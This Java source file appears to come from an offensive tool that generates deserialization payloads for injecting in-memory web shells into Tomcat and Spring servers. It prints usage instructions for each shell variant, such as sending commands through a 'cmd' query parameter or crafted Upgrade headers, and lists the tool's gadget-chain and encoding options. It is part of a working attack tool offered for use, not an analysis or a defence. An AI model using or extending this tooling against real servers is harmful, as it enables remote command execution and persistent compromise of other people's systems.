package main.utils;

public class ShowUtils {
    public static String showMemShellUse(String memShellType){
        System.out.println("----------------------------------------------------");
        if (memShellType.equals("Interceptor")){
            return "usage: http://hostname/?cmd=id\n" +
                    "useful for spring(maybe)";
        } else if (memShellType.equals("Filter")){
            return "usage: http://hostname/asd?cmd=id\n" +
                    "NOTE:please send payload twice to the server.\n" +
                    "Some tomcat version maybe not useful";
        } else if (memShellType.equals("Controller")){
            return "usage: http://hostname/asd?cmd=id\n" +
                    "just for spring";
        } else if (memShellType.equals("Listener")){
            return "usage: http://hostname/?cmd=id\n" +
                    "Listener mybe fun ^^";
        } else if (memShellType.equals("Servlet")){
            return "usage: http://hostname/asd?cmd=id\n" +
                    "For Tomcat XD";
        } else if (memShellType.equals("Upgrade")){
            return "usage: add these to HTTP header \n" +
                    "-----------------------------\n" +
                    "Connection: upgrade\n" +
                    "Upgrade: asd\n" +
                    "cmd: id\n" +
                    "-----------------------------\n" +
                    "upgrade maybe useful orz";
        } else if (memShellType.equals("Valve")){
            return "usage: http://hostname/?cmd=id\n" +
                    "amazing @_@";
        } else {
            return "";
        }
    }

    public static String showHelp(){
        return "java -jar javaMemShellDeserialize.jar -g gadgetName(cc4, cc7, cc2, cc5, cc6, rome1.0, rome1.7, commons-beanutils)\n" +
                " -m memShellName(Filter, Controller, Interceptor, Listener, Servlet, Upgrade, Valve)\n" +
                " -e encodeType(base64, URLEncode, hex)(default base64)";
    }
}
